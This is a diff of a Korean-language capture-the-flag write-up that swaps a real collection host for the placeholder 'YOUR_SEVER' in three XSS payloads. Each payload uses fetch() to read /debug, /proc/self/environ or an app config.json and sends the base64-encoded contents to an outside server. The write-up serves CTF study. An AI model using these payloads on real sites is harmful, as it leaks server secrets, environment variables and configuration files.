@@ -83,7 +83,7 @@ app.get('/debug', function(req, res) {
 
 따라서 `fetch()`를 이용하여 아래와 같이 페이로드를 작성할 수 있습니다.  
 ```python
-PAYLOAD = '<script>fetch("/debug").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://eo83ud3n5uavhrd.m.pipedream.net/f="%252bbtoa(xx)})</script>'
+PAYLOAD = '<script>fetch("/debug").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://YOUR_SEVER/f="%252bbtoa(xx)})</script>'
 ```
 {: file="z2.py"}
 <br/>
@@ -104,7 +104,7 @@ configFile: '{"flag": "wctf{redacted}", "httpOnly": true, "allowDebug": false}'
 
 `file` scheme을 이용하여 환경변수에 저장된 값을 읽도록 하였습니다.  
 ```python
-PAYLOAD = '<script>fetch("file:///proc/self/environ").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://eo83ud3n5uavhrd.m.pipedream.net/f="%252bbtoa(xx)})</script>'
+PAYLOAD = '<script>fetch("file:///proc/self/environ").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://YOUR_SEVER/f="%252bbtoa(xx)})</script>'
 ```
 {: file='z3.py'}
 <br/>
@@ -149,7 +149,7 @@ CMD ["node", "index.js"]
 <br/>
 
 ```python
-PAYLOAD = '<script>fetch("file:///ctf/app/config.json").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://eo83ud3n5uavhrd.m.pipedream.net/f="%252bbtoa(xx)})</script>'
+PAYLOAD = '<script>fetch("file:///ctf/app/config.json").then(function(x){return%2520x.text();}).then(function(xx){location.href="https://YOUR_SEVER/f="%252bbtoa(xx)})</script>'
 ```
 {: file='z4.py'}
 <br/>
